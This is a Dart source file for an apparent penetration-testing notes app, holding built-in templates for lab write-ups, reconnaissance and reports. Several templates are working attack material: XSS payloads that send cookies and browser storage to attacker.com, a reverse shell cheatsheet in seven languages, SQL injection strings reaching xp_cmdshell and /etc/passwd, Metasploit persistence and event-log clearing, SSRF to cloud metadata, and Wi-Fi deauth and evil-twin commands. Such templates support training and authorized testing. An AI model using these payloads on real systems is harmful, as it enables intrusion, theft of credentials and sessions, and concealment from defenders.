/// Service providing 15+ built-in templates for cybersecurity work
class TemplateService {
  static const Map<String, Template> templates = {
    'oscp_lab': Template(
      id: 'oscp_lab',
      name: 'OSCP Lab Notes',
      category: 'Training',
      language: 'markdown',
      content: '''# OSCP Lab - [Machine Name]

## Machine Info
- **IP Address:** 
- **OS:** 
- **Difficulty:** 

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oN nmap/initial [IP]
nmap -p- -oN nmap/all_ports [IP]
```

**Results:**
```

```

### Service Enumeration
- **Port 80/443 (HTTP/HTTPS):**
- **Port 21 (FTP):**
- **Port 22 (SSH):**
- **Port 445 (SMB):**

## Vulnerability Analysis

### Found Vulnerabilities
1. 

## Exploitation

### Initial Access
**Method:**
```bash

```

**User Flag:**
```

```

### Privilege Escalation
**Method:**
```bash

```

**Root Flag:**
```

```

## Lessons Learned
- 
''',
    ),
    
    'htb_machine': Template(
      id: 'htb_machine',
      name: 'HackTheBox Machine',
      category: 'Training',
      language: 'markdown',
      content: '''# HTB - [Machine Name]

## Info
- **IP:** 
- **OS:** 
- **Difficulty:** 
- **Points:** 

## Reconnaissance

### Nmap
```bash
nmap -sC -sV -p- -oA nmap/[machine] [IP]
```

### Web Enumeration
```bash
gobuster dir -u http://[IP] -w /usr/share/wordlists/dirb/common.txt
nikto -h http://[IP]
```

## Foothold

### Vulnerability

### Exploit

## User Flag
```

```

## Privilege Escalation

### Enumeration
```bash
# Linux
linpeas.sh
# Windows
winPEAS.exe
```

### Exploit

## Root/System Flag
```

```

## Key Takeaways
''',
    ),

    'tryhackme_room': Template(
      id: 'tryhackme_room',
      name: 'TryHackMe Room',
      category: 'Training',
      language: 'markdown',
      content: '''# TryHackMe - [Room Name]

## Room Info
- **Difficulty:** 
- **Type:** 
- **Link:** 

## Tasks

### Task 1: [Task Name]
**Questions:**
1. 
   - Answer: 

### Task 2: [Task Name]
**Commands:**
```bash

```

**Findings:**


## Flags
- User: 
- Root: 

## Notes
''',
    ),

    'burp_notes': Template(
      id: 'burp_notes',
      name: 'Burp Suite Session',
      category: 'Web Testing',
      language: 'markdown',
      content: '''# Burp Suite - [Target]

## Target Info
- **URL:** 
- **Date:** 
- **Scope:** 

## Findings

### 1. [Vulnerability Name]
**Severity:** Critical/High/Medium/Low

**Location:**
- URL: 
- Parameter: 

**Description:**


**Proof of Concept:**
```http
POST /endpoint HTTP/1.1
Host: target.com


```

**Impact:**


**Remediation:**


### 2. [Next Finding]

## Tools Used
- Burp Intruder
- Burp Repeater
- Burp Scanner

## Notes
''',
    ),

    'nmap_scan': Template(
      id: 'nmap_scan',
      name: 'Nmap Scan Results',
      category: 'Reconnaissance',
      language: 'bash',
      content: '''#!/bin/bash
# Nmap Comprehensive Scan

TARGET="[IP or DOMAIN]"
OUTPUT_DIR="nmap_results"

mkdir -p $OUTPUT_DIR

# Quick scan
echo "[+] Running quick scan..."
nmap -sV -sC -oN $OUTPUT_DIR/quick.txt $TARGET

# Full port scan
echo "[+] Running full port scan..."
nmap -p- -oN $OUTPUT_DIR/all_ports.txt $TARGET

# UDP scan (top 100)
echo "[+] Running UDP scan..."
sudo nmap -sU --top-ports 100 -oN $OUTPUT_DIR/udp.txt $TARGET

# Service and OS detection
echo "[+] Running detailed scan..."
nmap -A -sV -sC -p- -oN $OUTPUT_DIR/detailed.txt $TARGET

# Vulnerability scan
echo "[+] Running vulnerability scripts..."
nmap --script vuln -oN $OUTPUT_DIR/vulns.txt $TARGET

echo "[+] Scans complete! Results in $OUTPUT_DIR/"
''',
    ),

    'metasploit': Template(
      id: 'metasploit',
      name: 'Metasploit Session',
      category: 'Exploitation',
      language: 'bash',
      content: '''# Metasploit - [Target]

## Workspace Setup
```bash
msfconsole
workspace -a [target_name]
use auxiliary/scanner/portscan/tcp
set RHOSTS [IP]
run
```

## Exploitation

### Module Used
```bash
use exploit/[path/to/exploit]
set RHOSTS [IP]
set RPORT [port]
set LHOST [your_ip]
set LPORT 4444
set payload [payload_name]
show options
exploit
```

### Post-Exploitation
```bash
# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i 1

# Upload/Download
upload /local/file /remote/path
download /remote/file /local/path

# Privilege escalation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

## Persistence
```bash
run persistence -X -i 60 -p 4444 -r [your_ip]
```

## Cleanup
```bash
# Remove traces
clearev
```

## Notes
''',
    ),

    'sql_injection': Template(
      id: 'sql_injection',
      name: 'SQL Injection Test',
      category: 'Web Testing',
      language: 'sql',
      content: '''-- SQL Injection Test - [Target]

-- Basic Tests
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
') OR ('1'='1

-- Union-based SQLi
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Error-based SQLi
' AND 1=CONVERT(int,(SELECT @@version))--

-- Boolean-based Blind SQLi
' AND 1=1--
' AND 1=2--

-- Time-based Blind SQLi
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

-- Database enumeration
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Data extraction
' UNION SELECT username,password FROM users--

-- File read (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Command execution
'; EXEC xp_cmdshell('whoami')--

## Notes
- Target URL: 
- Vulnerable parameter: 
- Database type: 
- Findings: 
''',
    ),

    'xss_payloads': Template(
      id: 'xss_payloads',
      name: 'XSS Payloads',
      category: 'Web Testing',
      language: 'javascript',
      content: '''// XSS Payloads - [Target]

// Basic XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Bypass filters
<ScRiPt>alert('XSS')</sCrIpT>
<img src=x onerror="alert`XSS`">
<svg/onload=alert('XSS')>

// DOM-based XSS
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

// Stored XSS
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage
  })
});
</script>

// AngularJS
{{constructor.constructor('alert(1)')()}}

// React
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />

// Polyglot
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

/* Testing Notes
Target: 
Context: 
Filter bypasses: 
Success: 
*/
''',
    ),

    'reverse_shell': Template(
      id: 'reverse_shell',
      name: 'Reverse Shell Cheatsheet',
      category: 'Exploitation',
      language: 'bash',
      content: '''# Reverse Shell Cheatsheet

## Listener (Your Machine)
nc -lvnp 4444

## Bash
bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1
bash -c 'bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1'

## Netcat
nc -e /bin/bash [YOUR_IP] 4444
nc -e /bin/sh [YOUR_IP] 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR_IP] 4444 >/tmp/f

## Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

## PHP
php -r '$sock=fsockopen("[YOUR_IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

## Perl
perl -e 'use Socket;$i="[YOUR_IP]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## Ruby
ruby -rsocket -e'f=TCPSocket.open("[YOUR_IP]",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[YOUR_IP]",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

## Upgrading Shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
reset

## Notes
- Target IP: [YOUR_IP]
- Target Port: 4444
- Success: 
''',
    ),

    'privesc_linux': Template(
      id: 'privesc_linux',
      name: 'Linux Privilege Escalation',
      category: 'Privilege Escalation',
      language: 'bash',
      content: '''#!/bin/bash
# Linux Privilege Escalation Checklist

## System Information
uname -a
cat /etc/issue
cat /etc/*-release

## User Information
id
whoami
groups
sudo -l
cat /etc/passwd
cat /etc/shadow

## SUID/SGID Files
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

## Writable Directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

## Cron Jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

## Services Running as Root
ps aux | grep root
systemctl list-units --type=service --state=running

## Network
netstat -antup
ss -tulpn

## Password Files
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

## SSH Keys
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null

## Kernel Exploits
searchsploit linux kernel $(uname -r)

## Docker Escape
docker ps
ls -al /var/run/docker.sock

## PATH Hijacking
echo $PATH
find / -perm -u=s -type f 2>/dev/null | xargs strings | grep -i "PATH"

## Capabilities
getcap -r / 2>/dev/null

## Automated Tools
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

## Notes
''',
    ),

    'privesc_windows': Template(
      id: 'privesc_windows',
      name: 'Windows Privilege Escalation',
      category: 'Privilege Escalation',
      language: 'powershell',
      content: '''# Windows Privilege Escalation Checklist

## System Information
systeminfo
hostname
whoami /all
net users
net localgroup administrators

## Patch Level
wmic qfe get Caption,Description,HotFixID,InstalledOn

## Installed Software
wmic product get name,version
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion

## Running Processes
tasklist /v
Get-Process

## Services
sc query
Get-Service
wmic service list brief

## Scheduled Tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

## Network
ipconfig /all
route print
netstat -ano
netsh firewall show state
netsh firewall show config

## AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

## Unquoted Service Paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

## Weak Service Permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *

## Password Hunting
findstr /si password *.txt *.xml *.ini *.config
dir /s *pass* == *cred* == *vnc* == *.config*

## Saved Credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

## Registry Passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

## PowerShell History
Get-Content (Get-PSReadlineOption).HistorySavePath

## Automated Tools
# WinPEAS
.\winPEASx64.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

## Notes
''',
    ),

    'web_recon': Template(
      id: 'web_recon',
      name: 'Web Application Reconnaissance',
      category: 'Reconnaissance',
      language: 'bash',
      content: '''#!/bin/bash
# Web Application Reconnaissance

TARGET="[DOMAIN or IP]"

## Subdomain Enumeration
echo "[+] Enumerating subdomains..."
subfinder -d $TARGET -o subdomains.txt
amass enum -d $TARGET -o amass_subdomains.txt

## Directory Brute-forcing
echo "[+] Directory brute-forcing..."
gobuster dir -u https://$TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
feroxbuster -u https://$TARGET -w /usr/share/wordlists/dirb/common.txt

## Technology Detection
echo "[+] Detecting technologies..."
whatweb https://$TARGET
wappalyzer https://$TARGET

## Vulnerability Scanning
echo "[+] Running Nikto..."
nikto -h https://$TARGET -o nikto_results.txt

## Web Crawler
echo "[+] Crawling website..."
gospider -s https://$TARGET -o gospider_output

## Parameter Discovery
echo "[+] Finding parameters..."
paramspider -d $TARGET -o parameters.txt

## JavaScript Analysis
echo "[+] Extracting JavaScript files..."
python3 getJS.py -u https://$TARGET -o js_files/

## Wayback URLs
echo "[+] Fetching historical URLs..."
waybackurls $TARGET > wayback.txt

## Screenshots
echo "[+] Taking screenshots..."
gowitness single https://$TARGET

## SSL/TLS Check
echo "[+] Checking SSL/TLS..."
sslscan $TARGET
testssl.sh $TARGET

## DNS Records
echo "[+] DNS enumeration..."
dig $TARGET ANY
nslookup $TARGET

## WHOIS
echo "[+] WHOIS lookup..."
whois $TARGET

## Notes
Target: 
Date: 
Findings: 
''',
    ),

    'api_testing': Template(
      id: 'api_testing',
      name: 'API Security Testing',
      category: 'Web Testing',
      language: 'bash',
      content: '''# API Security Testing - [API Name]

## API Information
- **Base URL:** 
- **Authentication:** 
- **Documentation:** 

## Authentication Testing
```bash
# Test without authentication
curl -X GET "https://api.example.com/users"

# Test with invalid token
curl -X GET "https://api.example.com/users" -H "Authorization: Bearer INVALID"

# Test with valid token
curl -X GET "https://api.example.com/users" -H "Authorization: Bearer [TOKEN]"
```

## Authorization Testing
```bash
# Access other user's data
curl -X GET "https://api.example.com/users/2" -H "Authorization: Bearer [USER1_TOKEN]"

# Privilege escalation
curl -X POST "https://api.example.com/admin/users" -H "Authorization: Bearer [USER_TOKEN]"
```

## Input Validation
```bash
# SQL Injection
curl -X POST "https://api.example.com/search" -d '{"query":"test' OR '1'='1"}'

# NoSQL Injection
curl -X POST "https://api.example.com/login" -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# XXE
curl -X POST "https://api.example.com/parse" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
```

## Rate Limiting
```bash
# Brute force test
for i in {1..1000}; do
  curl -X POST "https://api.example.com/login" -d '{"username":"admin","password":"test'$i'"}'
done
```

## Mass Assignment
```bash
# Try to set admin field
curl -X POST "https://api.example.com/users" \
  -d '{"username":"test","email":"test@test.com","isAdmin":true}'
```

## SSRF Testing
```bash
# Internal network access
curl -X POST "https://api.example.com/fetch" -d '{"url":"http://127.0.0.1:8080"}'
curl -X POST "https://api.example.com/fetch" -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

## Excessive Data Exposure
```bash
# Request all fields
curl -X GET "https://api.example.com/users/1?fields=*"
```

## Findings
1. 

## Recommendations
''',
    ),

    'wireless_audit': Template(
      id: 'wireless_audit',
      name: 'Wireless Network Audit',
      category: 'Network Testing',
      language: 'bash',
      content: '''#!/bin/bash
# Wireless Network Security Audit

INTERFACE="wlan0"
BSSID="[TARGET_BSSID]"
CHANNEL="[TARGET_CHANNEL]"

## Monitor Mode
echo "[+] Enabling monitor mode..."
airmon-ng start $INTERFACE

## Network Discovery
echo "[+] Scanning for networks..."
airodump-ng ${INTERFACE}mon

## Capture Handshake
echo "[+] Capturing handshake..."
airodump-ng -c $CHANNEL --bssid $BSSID -w capture ${INTERFACE}mon

## Deauth Attack (in new terminal)
# aireplay-ng --deauth 10 -a $BSSID ${INTERFACE}mon

## WPA/WPA2 Cracking
echo "[+] Cracking WPA/WPA2..."
aircrack-ng -w /path/to/wordlist.txt -b $BSSID capture*.cap

## WPS Attack
echo "[+] Testing WPS..."
wash -i ${INTERFACE}mon
reaver -i ${INTERFACE}mon -b $BSSID -vv

## Client Deauth
echo "[+] Deauthing clients..."
aireplay-ng --deauth 0 -a $BSSID ${INTERFACE}mon

## Evil Twin Setup
echo "[+] Creating Evil Twin AP..."
airbase-ng -e "FreeWiFi" -c $CHANNEL ${INTERFACE}mon

## Cleanup
echo "[+] Cleaning up..."
airmon-ng stop ${INTERFACE}mon

## Tools
# WiFite
wifite --kill -i ${INTERFACE}mon

# Bettercap
bettercap -iface ${INTERFACE}mon

## Notes
Target SSID: 
Target BSSID: 
Encryption: 
Findings: 
''',
    ),

    'incident_response': Template(
      id: 'incident_response',
      name: 'Incident Response Log',
      category: 'Security Operations',
      language: 'markdown',
      content: '''# Incident Response - [Incident ID]

## Incident Details
- **Date/Time:** 
- **Reporter:** 
- **Severity:** Critical/High/Medium/Low
- **Status:** Open/Investigating/Contained/Resolved

## Initial Detection
**How was it detected?**


**Indicators of Compromise (IOCs):**
- 

## Timeline
| Time | Event | Action Taken |
|------|-------|--------------|
|      |       |              |

## Affected Systems
- 

## Impact Assessment
**Data:**
**Systems:**
**Users:**
**Business:**

## Containment Actions
1. 

## Eradication Steps
1. 

## Recovery Actions
1. 

## Root Cause Analysis
**What happened?**


**How did it happen?**


**Why did it happen?**


## Lessons Learned
**What went well:**
- 

**What could be improved:**
- 

**Action items:**
- 

## Evidence Collected
- 

## Related Incidents
- 
''',
    ),

    'pentest_report': Template(
      id: 'pentest_report',
      name: 'Penetration Test Report',
      category: 'Reporting',
      language: 'markdown',
      content: '''# Penetration Test Report

## Executive Summary
**Client:** 
**Test Date:** 
**Tester:** 
**Scope:** 

### Key Findings
- Critical: 
- High: 
- Medium: 
- Low: 

### Overall Risk Rating
[CRITICAL/HIGH/MEDIUM/LOW]

## Scope
**In-Scope:**
- 

**Out-of-Scope:**
- 

## Methodology
- Reconnaissance
- Vulnerability Scanning
- Exploitation
- Post-Exploitation
- Reporting

## Findings

### 1. [Vulnerability Name]
**Severity:** Critical/High/Medium/Low
**CVSS Score:** 

**Description:**


**Affected Systems:**
- 

**Proof of Concept:**
```

```

**Impact:**


**Remediation:**


**References:**
- 

---

### 2. [Next Finding]

## Appendix

### Tools Used
- 

### Timeline
| Date | Activity |
|------|----------|
|      |          |

### Testing Team
- 
''',
    ),
  };

  /// Gets template by ID
  static Template? getTemplate(String id) {
    return templates[id];
  }

  /// Gets all templates
  static List<Template> getAllTemplates() {
    return templates.values.toList();
  }

  /// Gets templates by category
  static List<Template> getTemplatesByCategory(String category) {
    return templates.values
        .where((template) => template.category == category)
        .toList();
  }

  /// Gets all categories
  static List<String> getCategories() {
    return templates.values
        .map((template) => template.category)
        .toSet()
        .toList()
      ..sort();
  }
}

/// Template model
class Template {
  final String id;
  final String name;
  final String category;
  final String language;
  final String content;

  const Template({
    required this.id,
    required this.name,
    required this.category,
    required this.language,
    required this.content,
  });
}
